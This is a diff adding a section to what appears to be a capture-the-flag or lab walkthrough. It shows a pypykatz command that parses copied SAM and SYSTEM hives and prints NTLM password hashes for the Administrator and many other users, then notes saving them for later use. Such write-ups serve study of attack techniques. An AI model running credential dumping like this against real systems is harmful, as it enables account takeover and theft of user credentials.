@@ -487,5 +487,42 @@ smb: \>
 This copied the files to my machine
 
 ```python
-
+pypykatz registry --sam sam system
+WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
+WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
+============== SYSTEM hive secrets ==============
+CurrentControlSet: ControlSet001
+Boot Key: 7c7cfe4ff1d4639aaa93ddd2be306cc0
+============== SAM hive secrets ==============
+HBoot Key: 22a4dbbc6e9bb077f9633b22710a5c1a10101010101010101010101010101010
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d5cad8a9782b2879bf316f56936f1e36:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
+ghill_sa:1000:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::
+fin_user1:1001:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+hr_admin:1002:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+proj_mgr:1003:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+db_readonly:1004:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+audit_user:1005:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+payroll_clerk:1006:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+vpn_user:1007:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+intranet_admin:1008:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+inv_user:1009:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+training_user:1010:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+devops_user:1011:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+support_staff:1012:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+mktg_user:1013:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+sales_rep:1014:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+legal_user:1015:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+ops_mgr:1016:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+eng_user:1017:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+procure_user:1018:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+facilities_user:1019:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+research_user:1020:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
+bbarkinson:1021:aad3b435b51404eeaad3b435b51404ee:53c3709ae3d9f4428a230db81361ffbc:::
 ```
+Now i have dumped all the hashes of all the users
+
+It may be a good idea to grab each of these hashes and put them into a file
+
